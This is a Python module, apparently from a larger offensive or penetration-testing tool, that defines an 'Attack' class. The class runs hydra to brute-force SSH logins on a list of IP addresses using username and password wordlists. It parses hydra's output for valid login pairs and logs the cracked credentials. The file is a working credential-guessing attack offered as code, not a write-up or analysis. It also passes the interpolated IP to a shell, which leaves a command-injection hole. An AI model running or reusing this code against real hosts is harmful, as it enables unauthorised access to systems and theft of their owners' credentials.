import logging
import subprocess

from colorama import Fore


def get_command(ip):
    return f"hydra -t 4 -w 10 -f -I -L $PWD/data/user.txt -P $PWD/data/pass.txt {ip} ssh"


class Attack:

    def __init__(self):
        self.user = []
        self.passwords = []
        self.ips = []
        self.ports = []
        self.cmd = ""
        logging.info("Spinning up attack module...")

    def load_info(self, info):
        self.ports = {}
        for elem in info:
            self.ips.append(elem[0])
            self.ports[elem[0]] = elem[1]
        # self.cmd = "hydra -t 4 -w 10 -f -I -L $PWD/data/user.txt -P $PWD/data/pass.txt -u ssh://"

    def work(self):
        result = []

        for ip in self.ips:
            try:
                logging.info(f"Start attacking: {ip}")
                with subprocess.Popen(get_command(ip), shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE) as proc:
                    stdout, stderr = proc.communicate()
                    logging.debug(stderr)
                    logging.debug(stdout)
                    answer = stdout.decode("utf-8")
                    if answer.__contains__("valid pair found"):
                        answers = answer.split('\n')
                        for ans in answers:
                            if ans.__contains__("[ssh]"):
                                words = ans.split(" ")
                                login = words[6]
                                password = words[10]
                                result.append((ip, self.ports[ip], login, password))
                                logging.info(f"Credentials are: {result}")

            except subprocess.CalledProcessError:
                logging.debug(f"{Fore.YELLOW}No result for {ip}. Reason: error.{Fore.RESET}")

        return result
